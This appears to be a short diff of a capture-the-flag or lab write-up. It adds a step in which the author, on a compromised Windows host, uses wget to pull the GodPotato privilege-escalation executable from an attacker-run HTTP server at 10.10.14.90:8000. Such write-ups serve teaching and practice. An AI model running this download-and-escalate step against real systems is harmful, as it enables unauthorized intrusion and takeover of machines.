@@ -534,5 +534,10 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Ill start a server on my system to host it
 
 ```python
+PS C:\Windows\system32> wget http://10.10.14.90:8000/GodPotato-NET4.exe
+```
+This downloaded it
+
+```python
 
 ```
